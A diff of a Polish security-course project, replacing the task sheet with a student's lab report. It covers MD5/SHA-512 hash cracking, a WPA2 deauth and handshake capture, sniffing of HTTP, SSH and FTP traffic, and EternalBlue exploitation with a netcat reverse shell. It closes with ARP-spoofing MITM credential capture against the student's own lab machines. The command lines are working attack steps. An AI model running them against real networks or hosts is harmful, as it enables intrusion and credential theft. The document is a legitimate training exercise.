@@ -1,178 +1,217 @@
-Projekt wymaga zastosowania w praktyce wiedzy nt. sieci 
-komputerowych, systemów Linux i Windows, metod 
-omijania zabezpieczeń oraz umiejętności programowania w 
-Pythonie*.
+Projekt: Omijanie zabezpieczeń
 
-Wymagania 
-• Wykonanie przez grupę podstawowych zadań projektowych
-• Dostarczenie raportu z projektu w formie publicznego repozytorium na 
-GitHubie
-• Raport powinien zawierać:
-• chronologiczny opis realizacji zadań projektowych
-• uruchomione programy, wykonane komendy oraz ich efekt
-• screenshoty
-• inne elementy wzbogacające raport (jeżeli grupa uważa je za istotne)
-
-Środowisko projektowe / narzędzia
-Na środowisko projektowe składają się:
-● maszyna wirtualna Kali Linux
-● maszyna wirtualna Windows 7
-● maszyna wirtualna SDA z przekazanego pliku .ova. Link do OVA :)
-● telefon
-● dodatkowe urządzenie “z Wi-Fi” (np. drugi telefon lub laptop)
-Dodatkowo na potrzeby projektu wykorzystywane są zasoby zewnętrzne zdefiniowane w 
-poszczególnych zadaniach.
-Maszyny wirtualne oraz telefon powinny znajdować się w tej samej sieci. W ustawieniach 
-sieciowych maszyny wirtualnej w VirtualBox najlepiej wybrać adapter sieciowy zmostkowany 
-(bridged), tak aby maszyny mogły zarówno komunikować się ze sobą jak i miały dostęp do 
-Internetu.
-
-Zadania do wykonania
-Na projekt składa się 9 odrębnych zadań:
-● 6 zadań podstawowych
-● 3 zadań dla chętnych
-
-Zadanie 1 - Łamanie haseł (met. 
-brute-force) 1/3
-Środowisko: Kali Linux
-Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a 
-następnie złam hasło metodą brute-force.
-Każde hasło składa się z maksymalnie 5 znaków (tylko cyfry).
+Zadanie 1 - Łamanie haseł - brute force
+1/3
 1. 81dc9bdb52d04dc20036dbd8313ed055
-2. b021d0862bc76b0995927902ec697d97b5080341a53cd90b780f50fd5886f4160bbb9d4a
-573b76c23004c9b3a44ac95cfde45399e3357d1f651b556dfbd0d58f
+Identyfikacja radzaju kodowania
+Crakowanie przy pomocy hashcat:
+Komenda:
+hashcat -m 0 -a 3 hash1.hash --increment --increment-min 1 --increment-max 5
+-m 0 <--- Rodzaju kodowania 0 = MD5
+-a 3 <--- Wybor rodzaju ataku 3 = brute force
+hash1.hash <--- plik z hash'em
+--increment <--- Tryb inkrementacji, min - minimalna ilosc
+znakow, max - maksymalna ilosc znakow
+Wynik: [1234]
+
+2. b021d0862bc76b0995927902ec697d97b5080341a53cd90b780f50fd5886f4160bbb9d4a573b76c23
+004c9b3a44ac95cfde45399e3357d1f651b556dfbd0d58f
+Identfyfikacja rodzaju kodowania
+Crakowanie przy pomocy hashcat:
+Komenda:
+hashcat -m 1700 -a 3 hash2.hash --increment --increment-min 1 --increment-max
+5 {.inline-code}
+-m <--- Rodzaj kodowania, 1700 = SHA-512
+Wynik:[6969]{.mark}
+
 3. 7aaa0f57
-4. 31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68d
-bf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99
+Identfyfikacja rodzaju kodowania
+Crakowanie przy pomocy hashcat:
+Komenda:
+hashcat -m 11500 -a 3 hash3.hash --increment --increment-min 1 --increment-max 5
+-m <--- Rodzaj kodowania, 11500 = CRC-32, do hash'a nalezy dodac
+':00000000'
+Wynik:[2022]{.mark}
 
-Zadanie 1 - Łamanie haseł (met. 
-brute-force) 2/3
-Środowisko: Kali Linux
-Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie 
-złam hasło metodą brute-force.
-Każde hasło składa się z maksymalnie 5 znaków (małe i wielkie litery).
-1. 9e66d646cfb6c84d06a42ee1975ffaae90352bd016da18f51721e2042d9067dcb120accc5741
-05b43139b6c9c887dda8202eff20cc4b98bad7b3be1e471b3aa5
-2. 8a04bd2d079ee38f1af784317c4e2442625518780ccff3213feb2e207d2be42ca0760fd847618
-4a004b71bcb5841db5cd0a546b9b8870f1cafee57991077c4a9
+4. 31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a54
+36ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99
+Identfyfikacja rodzaju kodowania
+Komenda:
+hashcat -m 1700 -a 3 hash4.hash --increment --increment-min 1 --increment-max 5
+Wynik:
+2/3
+1. 9e66d646cfb6c84d06a42ee1975ffaae90352bd016da18f51721e2042d9067dcb120accc574105b43
+139b6c9c887dda8202eff20cc4b98bad7b3be1e471b3aa5
+Identyfikacja kodowania
+Komenda: hashcat -m 1700 -a 3 hash5.hash --increment --increment-min 1 --
+increment-max 5
+Wynik:sda
+2. 8a04bd2d079ee38f1af784317c4e2442625518780ccff3213feb2e207d2be42ca0760fd8476184a004
+b71bcb5841db5cd0a546b9b8870f1cafee57991077c4a9
+Identyfikacja kodowania
+Komenda: hashcat -m 1700 -a 3 hash6.hash --increment --increment-min 1 --
+increment-max 5
+Wynik:Asia
+3/3
+1. hash:44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953e20
+5a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da
+Identyfikacja kodownia
+Komenda: hashcat -m 1700 -a 3 hash7.hash ?a?a?a?a?a?a
+Łamanie hasła przy pomocy GPU
+2. Wynik: T0^^3k
 
-Zadanie 1 - Łamanie haseł (met. 
-brute-force) 3/3
-Środowisko: Kali Linux
-Dla podanego niżej hasha określ typ wykorzystanego algorytmu hashującego, a następnie 
-złam hasło metodą brute-force.
-Hasło składa się z dokładnie z 6 znaków alfanumerycznych.
-W miarę możliwości skorzystaj z GPU lub wykonaj zadanie po zajęciach.
-1. 44d9886c0a57ddbfdb31aa936bd498bf2ab70f741ee47047851e768db953fc4e43f92be953
-e205a3d1b3ab752ed90379444b651b582b0bc209a739a624e109da
 
-Zadanie 2 - Łamanie haseł (met. 
-słownikowa) 1/2
-Środowisko: Kali Linux
-Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie 
-złam hasło metodą słownikową.
-Hasła pochodzą ze słownika rockyou-50.
+Zadanie 2 - Łamanie haseł (met. slownikowa)
+1/2
+hash'e:
 1. 9fd8301ac24fb88e65d9d7cd1dd1b1ec
 2. 7f9a6871b86f40c330132c4fc42cda59
 3. 6104df369888589d6dbea304b59a32d4
 4. 276f8db0b86edaa7fc805516c852c889
 5. 04dac8afe0ca501587bad66f6b5ce5ad
+Wszystkie hashe znajduja sie w jednym pliku, poniewaz maja ten sam
+typ kodowania MD5. Uzyty program to John The Ripper oraz slownik
+rockyou-50
+Komenda:
+john --format=Raw-MD5 --wordlist=rockyou-50.txt hashes1.hash
+Wynik:
+1. butterfly
+2. tinkerbell
+3. blink182
+4. baseball
+5. hellokitty
+--format=RAW-MD5 <--- Wybor kodowania MD5
+--wordlist=rockyou-50.txt <--- Podanie sciezki do slownika
+hashes1.hash <--- Plik z hash'ami
+2/2
+hash'e
+1. 7ab6888935567386376037e042524d27fc8a24ef87b1944449f6a0179991dbdbc481e98db4e70f
+6df0e04d1a69d8e7101d881379cf1966c992100389da7f3e9a
+2. 470c62e301c771f12d91a242efbd41c5e467cba7419c664f784dbc8a20820abaf6ed43e09b0cda
+994824f14425db3e6d525a7aafa5d093a6a5f6bf7e3ec25dfa
+Wszystkie hashe znajduja sie w jednym pliku, poniewaz maja ten
+sam typ kodowania SHA512. Uzyty program to John The Ripper
+oraz slownik rockyou-50
+Komenda:
+john --format=Raw-SHA512 --wordlist=rockyou-50.txt hashes2.hash
+---show <--- Wyswietla wynik zlaanych hasel
+Wynik:
+1. spiderman
+2. rockstar
 
-Zadanie 2 - Łamanie haseł (met. 
-słownikowa) 2/2
-Środowisko: Kali Linux
-Dla podanych niżej hashy określ typ wykorzystanego algorytmu hashującego, a następnie 
-złam hasło metodą słownikową.
-Hasła pochodzą ze słownika rockyou-50.
-1. 7ab6888935567386376037e042524d27fc8a24ef87b1944449f6a0179991dbdbc481e98db4
-e70f6df0e04d1a69d8e7101d881379cf1966c992100389da7f3e9a
-2. 470c62e301c771f12d91a242efbd41c5e467cba7419c664f784dbc8a20820abaf6ed43e09b0c
-da994824f14425db3e6d525a7aafa5d093a6a5f6bf7e3ec25dfa
 
 Zadanie 3 - Atak na sieć Wi-Fi
-Środowisko: Kali Linux, telefon, urządzenie dodatkowe
-1. Na telefonie utwórz hotspot (punkt dostępowy) z siecią zabezpieczoną w standardzie 
-WPA2-PSK. Sam wybierz hasło do sieci.
-2. Dodatkowym urządzeniem (np. drugi telefon lub laptop) podłącz się do utworzonej sieci.
-3. Z użyciem zestawu narzędzi aircrack-ng przeprowadź atak na sieć Wi-Fi:
-a. wykonaj deautentykację podłączonych urządzeń
-b. przechwyć 4-way handshake
-4. Złam hasło, które sam ustawiłeś (dowolnie wybraną metodą).
+Na samym poczatku uruchamiam
+sudo airmon-ng check kill
+w celu ubicia innych procesów, które mogą przeszkadzać w monitoringu
+otoczenia.
+Następnie uruchamiam monitoring otoczenia wskazując odpowiednią
+kartę sieciową:
+sudo airodump-ng wlan0mon
+Łapiemy handshake
+sudo airodump-ng --bssid BA:18:69:CC:1E:61 -c 11 --write WPAcrack
+wlan0mon
+--bssid <--- Podajemy adres MAC celu
+-c <--- Wybieramy kanal
+--write <--- Podajemy nazwe outputu
+sudo aireplay-ng --deauth 30 -a BA:18:69:CC:1E:61 wlan0mon
+--deauth 30 <--- Wysylamy 30 pakietow w xelu zerwania polaczenia
+Lamiemy haslo
+sudo aircrack-ng WPAcrack-01.cap -w rockyou_50.txt
+Wynik: 123456qwerty
+
 
 Zadanie 4 - Analiza ruchu HTTP
-Środowisko: Kali Linux
-1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
-2. W przeglądarce nawiąż połączenie z http://testphp.vulnweb.com/login.php
-3. Wykonaj próbę logowania (dowolne dane).
-4. Odszukaj w zapisanym ruchu swoje dane logowania.
-Dla porównania powtórz ćwiczenie z logowaniem np. do Facebooka (również dowolne, 
-nieprawdziwe dane logowania).
+Uruchomiony Wireshark i wybrane eth0.
+Filtr http, na podanej stronie zostaly podane credentiale. Wireshark
+przechwycil wpisane dane poniwaz http nie jest szyfrowany. W wypadku
+HTTPS nie ma mozliwosc w normalnych warunkach przechwycic uzytkownika
+oraz hasla, poniewaz sa one szyfrowane.
+
 
 Zadanie 5 - Analiza ruchu SSH
-Środowisko: Kali Linux, maszyna SDA z projektu 1
-1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
-2. Nawiąż połączenie pomiędzy Kalim a SDA po SSH.
-3. Stwórz pliki sekret1.txt i sekret2.txt z tajnymi hasłami.
-4. Edytuj konfigurację vsFTPd, żeby umożliwić wgrywanie plików po FTP.
-5. Zakończ połączenie po SSH.
-6. Spróbuj poszukać w zapisanym ruchu sieciowym zawartość plików sekret1.txt i sekret2.txt
-Dane logowania do SDA: uranus/butterfly, root/666
+Moje ip: 192.168.0.105 Cel: 192.168.0.106
+Wireshark uruchomiony z filterm ssh.
+Nazwiazanie polaczenia miedzy Kali a SDA
+Przeslanie plikow z haslami do ssh
+Przejscie do katalogu gdzie zostaly przeslane pliki /home i wyswietlenie
+ich
+Wynik Wireshark'a:
+Nie da sie odczytac przeslanych hasel przez ssh, poniewaz ssh jest
+protokolem szyfrowanym.
+Zmiany w vsFTPd.conf
+
 
 Zadanie 6 - Analiza ruchu FTP
-Środowisko: Kali Linux, maszyna SDA z projektu 1
-1. Rozpocznij monitorowanie ruchu sieciowego (narzędziem Wireshark).
-2. Nawiąż połączenie pomiędzy Kalim a SDA po FTP.
-3. Prześlij z Kaliego do SDA zwykły plik tekstowy (z własną zawartością).
-4. Ściągnij z SDA do Kaliego pliki sekret1.txt i sekret2.txt
-5. Zakończ połączenie.
-6. Odszukaj w zapisanym ruchu sieciowym zawartość przesłanego i ściągniętych plików.
-Dane logowania do SDA: uranus/butterfly, root/666
+Wireshark uruchomiony z filterm ftp-data
+Nawiazenie polaczenia pomiedzy Kali a SDA po FTP
+Przeslanie z Kaliego pliku tekstowego test.txt
+Pobranie z Kali plikow sekret1.txt oraz sekret2.txt
+Zawartosc pobranego oraz przeslanych plikow
 
 
 Zadania dodatkowe
+Eternal blue - wedlug informacji z internetu podatnosc to CVE-2017-0143 (EternalBlue)
+1. Scan sieci w poszukiwaniu ip maszyny z win7
+sudo arp-scan -l
+-l <--- Skanuje lokalna siec
+Cel: 192.168.0.18
+2. Skanowanie ip nmap'em w celu znalezienia podatności. Według informacji z internetu podatność
+EternalBlue znajduje się na porcie 445
+sudo nmap -p445 --script smb-vuln-ms17-010 192.168.0.18
+-p445 <--- Skanowanie poru 445
+--script <--- Wywołanie skryptu
+smb-vuln-ms17-010 <--- Nazwa skryptu z podatnoscią EternalBlue
+3. Urochomiesnie frameworku metasploit: msfconsole. Znalezienie podatności. Ustawienie parametru
+RHOSTS. Uruchomienie podatności. Uzyskanie dostępu
 
-Zadanie 7 - Eternal Blue
-Atakujący: Kali Linux | Ofiara: Windows 7
-1. Przygotuj maszynę wirtualną z podatnością MS17-010 (np. Windows 7) i umieść ją w tej 
-samej sieci co Kali Linux.
-Atakujący:
-2. Wykryj i potwierdź podatność (np. nmapem).
-3. Wykorzystaj podatność korzystając z frameworka Metasploit (nie jest wymagana 
-eskalacja uprawnień).
-Dla chętnych:
-1. Wykorzystaj podatność MS17-010 bez użycia Metasploita.
+EternalBlue manualne użycie podatności
+Najpierw nalezy sciagnac plik ze strony
+wget https://github.com/3ndG4me/AutoBlue-MS17-010
+pip install -r requirements.txt
+cd shellcode
+sudo nmap -sV -p 445 -O 192.168.1.145
+Sprawdzenie czy istnieje odpowiedni skrypt nmap:
+ls -al /usr/share/nmap/scripts | grep smbUruchomienie skryptu nmap:
+sudo nmap -sV -p 445 -O --script=smb-vuln-ms17-010.nse 192.168.1.145
+Nadanie uprawnien:
+chmod +x shell_prep.sh
+Uruchomienie:
+./shell_prep.sh
+LHOST for reverse connection:
+192.168.1.143
+LPORT you want x64 to listen on:
+1234
+LPORT you want x86 to listen on:
+1234
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+ls -alps
+..
+ls -alps
+W drugim oknie Kali-Linux
+nc -vnlp 1234
+W pierwszym oknie Kali-Linux
+chmod +x eternalblue_exploit7.py
+python3 eternalblue_exploit7.py
+python3 eternalblue_exploit7.py 192.168.1.145 shellcode/sc_x64.bin
 
-Kali Linux Live USB
-Przygotowanie Live USB
-1. Korzystając z instrukcji przygotuj bootowalnego pendriva z systemem Kali Linux
-2. W opcjach BIOSu zmień kolejność bootowania (pendrive z Kalim powinien znaleźć 
-się na pierwszym miejscu).
-3. Uruchom ponownie komputer.
-4. Komputer powinien uruchomić się z pendriva z Kalim zamiast z dysku z głównym 
-systemem operacyjnym.
-Kolejne zadania (dla chętnych) wymagają korzystania z Kaliego Live USB, a nie z 
-maszyny wirtualnej.
 
-Zadanie 8 - MITM przez ARP poisoning
-Atakujący: Kali Linux | Ofiara: telefon
-Atakujący:
-1. Wykonaj atak MITM techniką ARP poisoning (ARP spoofing)1 
-Ofiara:
-1. W przeglądarce nawiąż połączenie z http://testphp.vulnweb.com/login.php.
-2. Wykonaj próbę logowania (dowolne dane).
-Atakujący:
-1. Odszukaj w zapisanym ruchu dane logowania ofiary.
-1 - np. narzędziem arpspoof
 
-Zadanie 9 - SSL Stripping
-Atakujący: Kali Linux | Ofiara: telefon
-Atakujący:
-1. Wykonaj atak MITM techniką ARP poisoning (ARP spoofing)1
-2. Wykonaj atak SSL stripping2
-Ofiara:
-1. W przeglądarce nawiąż połączenie z NUTZINDIA.com
-2. Wykonaj próbę logowania (dowolne dane).
-Atakujący:
-1. Odszukaj w zapisanym ruchu dane logowania ofiary.
-1 - narzędziem arpspoof
-2 - narzędziem sslstrip
+
+MITM przez ARP poisoning cel: 192.168.0.12
+1. Najpierw należy zmienić parametr ip_forward na 1 w celu przekazywanie pakietów dalej, które nie
+są skierowane do naszego adresu echo 1 > /proc/sys/net/ipv4/ip_forward
+2. Kolejny krok należy wykonać w dwóch osobnych oknach terminala
+sudo arpspoof -i wlan0 -t 192.168.0.12 192.168.0.1
+-i wlan0 <--- Wybór urządzenia sieciowego
+-t <--- Należy podać ip celu oraz ip routera
+W drugim oknie parametry należy zamienić miejscami
+sudo arpspoof -i wlan0 -t 192.168.0.1 192.168.0.12
+Następnie uruchamiamy Wireshark z filtrem http oraz na telefonie wpisujemy dane logowania na
+stronie http.
+Wireshark wyłapał podane credentiale:
+uname: MITMprojekt2
+pass:123456789xxx
